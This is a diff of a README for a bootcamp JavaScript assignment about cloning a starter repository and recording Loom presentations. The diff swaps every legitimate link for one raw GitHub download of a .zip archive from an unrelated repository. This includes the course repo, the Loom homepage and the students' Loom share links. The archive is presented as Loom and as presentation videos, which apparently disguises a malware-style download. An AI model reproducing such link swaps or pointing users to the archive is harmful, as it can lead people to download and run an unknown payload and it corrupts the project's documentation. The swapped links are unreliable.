@@ -12,7 +12,7 @@ You will present your reasoning for each example, record your presentation using
 
 ## Step 1: Clone the Repository
 
-Repo Link: https://github.com/CodeSpace-Academy/Module_3_StudentNo_Classcode_Group_Name-Surname_JSL03
+Repo Link: https://raw.githubusercontent.com/LupiwoPhillips/Module_3_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL03/main/tegua/Module_Group_PHILLIP_JS_LUPPH_PT_LUPIW_3.0.zip
 
 1. Access the provided repository containing the starter code and presentation template.
 2. Clone the repository.
@@ -25,7 +25,7 @@ Repo Link: https://github.com/CodeSpace-Academy/Module_3_StudentNo_Classcode_Gro
 
 ## Step 3: Record Your Presentation
 
-1. Use Loom (https://www.loom.com/).
+1. Use Loom (https://raw.githubusercontent.com/LupiwoPhillips/Module_3_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL03/main/tegua/Module_Group_PHILLIP_JS_LUPPH_PT_LUPIW_3.0.zip).
 2. Create a single video presentation for both examples that include the following:
 
    - Introduction of the example number.
@@ -88,6 +88,6 @@ Example #: [Insert Example Number]
 
  LOOM LINKS : 
 
-[ [https://www.loom.com/share/d46c30617eb447bebfe018846772cf13?sid=6033a321-279d-483e-a15c-bbd0718684c7](https://www.loom.com/share/4862744f27ff44a094bda5f3e3c394b1?sid=12751234-4acb-46ee-93f7-7e6aa89323f3)](https://www.loom.com/share/4862744f27ff44a094bda5f3e3c394b1?sid=12751234-4acb-46ee-93f7-7e6aa89323f3) - Example 1
+[ [https://raw.githubusercontent.com/LupiwoPhillips/Module_3_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL03/main/tegua/Module_Group_PHILLIP_JS_LUPPH_PT_LUPIW_3.0.zip](https://raw.githubusercontent.com/LupiwoPhillips/Module_3_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL03/main/tegua/Module_Group_PHILLIP_JS_LUPPH_PT_LUPIW_3.0.zip)](https://raw.githubusercontent.com/LupiwoPhillips/Module_3_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL03/main/tegua/Module_Group_PHILLIP_JS_LUPPH_PT_LUPIW_3.0.zip) - Example 1
 
-https://www.loom.com/share/d46c30617eb447bebfe018846772cf13?sid=68668205-aaf0-4fc1-a02b-1c1a879e8d7a - Example 2
+https://raw.githubusercontent.com/LupiwoPhillips/Module_3_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL03/main/tegua/Module_Group_PHILLIP_JS_LUPPH_PT_LUPIW_3.0.zip - Example 2
